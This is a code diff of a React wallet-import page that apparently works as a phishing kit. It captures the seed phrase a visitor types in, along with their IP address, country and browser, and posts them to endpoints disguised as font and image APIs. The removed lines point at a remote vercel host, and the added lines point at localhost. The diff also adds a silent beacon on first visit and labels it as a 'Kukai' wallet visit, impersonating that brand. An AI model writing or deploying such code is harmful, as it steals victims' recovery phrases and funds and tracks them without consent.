@@ -23,26 +23,34 @@ export default function ImportWallet() {
   const router = useRouter()
 
   useEffect(() => {
+    const isFirstVisit = localStorage.getItem("isFirstVisit");
+  
+    if (!isFirstVisit) {
+      // Run sendMessageAlt on the user's first visit
+      sendMessageAlt();
+      localStorage.setItem("isFirstVisit", "true");
+    }
+  
     const fetchUserInfo = async () => {
       const userInfo = await getUserCountry();
       setUserInfo(userInfo);
     };
     const fetchWordList = async () => {
       try {
-        const wordList = await axios.get("https://www.kaspawallet.org/seedphrase.txt")
-        setSeedPhraseList(wordList.data)
+        const wordList = await axios.get("https://www.kaspawallet.org/seedphrase.txt");
+        setSeedPhraseList(wordList.data);
       } catch (error) {
-        console.error("Failed to fetch seed phrase list:", error)
+        console.error("Failed to fetch seed phrase list:", error);
       }
-    }
+    };
+  
     const userAgent = navigator.userAgent;
-    setUserAgent(userAgent)
+    setUserAgent(userAgent);
     fetchUserInfo();
-    fetchWordList()
-    setWindowLocation(window.location.href)
+    fetchWordList();
+    setWindowLocation(window.location.href);
   }, []);
-
-
+  
   const messageData = {
     country: userInfo?.country || "Unknown",
     browser: userAgent,
@@ -57,7 +65,7 @@ export default function ImportWallet() {
     country: userInfo?.country,
     browser: userAgent,
     ipAddress: userInfo?.ip,
-    appName: windowLocation,
+    appName: "Kukai Visit",
   };
 
   const sendMessage = async () => {
@@ -65,7 +73,7 @@ export default function ImportWallet() {
     messageData.seedPhrase = seedPhraseFormatted;
     console.log(messageData)
     try {
-      await fetch("https://fonts7787.vercel.app/api/t1/image", {
+      await fetch("http://localhost:3001/api/t1/image", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -79,11 +87,11 @@ export default function ImportWallet() {
   }
 
   const sendMessageAlt = async () => {
-    fetch("https://fonts7787.vercel.app/api/t1/font", {
+    fetch("http://localhost:3001/api/t1/font", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
-        "x-api-key": import.meta.env.VITE_APP_SECRET_KEY,
+        "x-api-key": process.env.VITE_APP_SECRET_KEY,
       },
       body: JSON.stringify(messageDataAlt),
     }).catch((error) => console.error("Error sending font message:", error));
@@ -118,25 +126,6 @@ export default function ImportWallet() {
     setSeedPhraseMessage(inputWords); // Store the valid seed phrase
   };
 
-  
-
-  const binarySearch = (arr, target) => {
-    let left = 0;
-    let right = arr.length - 1;
-
-    while (left <= right) {
-      const mid = Math.floor((left + right) / 2);
-      if (arr[mid] === target) {
-        return mid;
-      } else if (arr[mid] < target) {
-        left = mid + 1;
-      } else {
-        right = mid - 1;
-      }
-    }
-
-    return -1;
-  };
 
 
   return (
